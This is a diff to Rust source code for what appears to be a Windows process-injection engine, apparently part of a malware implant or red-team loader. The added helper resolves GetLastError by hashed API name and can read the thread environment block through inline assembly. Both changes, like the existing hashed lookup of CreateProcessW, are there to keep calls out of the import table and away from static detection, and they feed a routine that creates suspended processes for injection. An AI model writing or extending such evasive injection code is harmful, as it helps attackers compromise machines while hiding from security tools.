@@ -49,6 +49,31 @@
 use crate::injection_engine::{InjectionError, InjectionHandle, InjectionTechnique};
 use std::ffi::c_void;
 
+// ── Helpers ──────────────────────────────────────────────────────────────────
+
+/// Dynamically-resolved GetLastError (reads TEB, no IAT entry).
+#[cfg(windows)]
+unsafe fn get_last_error() -> u32 {
+    use std::sync::OnceLock;
+    static GET_LAST_ERROR: OnceLock<Option<unsafe extern "system" fn() -> u32>> = OnceLock::new();
+    let fn_ptr = GET_LAST_ERROR.get_or_init(|| {
+        let kernel32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
+        let addr = pe_resolve::get_proc_address_by_hash(
+            kernel32,
+            pe_resolve::hash_str(b"GetLastError\0"),
+        )?;
+        Some(std::mem::transmute(addr))
+    });
+    if let Some(func) = fn_ptr {
+        func()
+    } else {
+        // Fallback: read TEB directly (x86_64 Windows)
+        let teb: *mut u8;
+        std::arch::asm!("mov {}, gs:[0x30]", out(reg) teb);
+        std::ptr::read_volatile(teb.add(0x68) as *const u32)
+    }
+}
+
 // ── Constants ────────────────────────────────────────────────────────────────
 
 /// CREATE_SUSPENDED flag for CreateProcessW.
@@ -943,7 +968,6 @@ unsafe fn create_suspended_process(
     target_path: &[u16],
 ) -> Result<SuspendedProcess, String> {
     use winapi::um::processthreadsapi::{PROCESS_INFORMATION, STARTUPINFOW};
-    use winapi::um::winnt::PROCESS_ALL_ACCESS;
 
     // Dynamically resolve CreateProcessW from kernel32 to avoid IAT entry.
     let k32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)
@@ -986,7 +1010,7 @@ unsafe fn create_suspended_process(
     if success == 0 {
         return Err(format!(
             "CreateProcessW failed for suspended process (error: {})",
-            winapi::um::errhandlingapi::GetLastError()
+            unsafe { get_last_error() }
         ));
     }
 
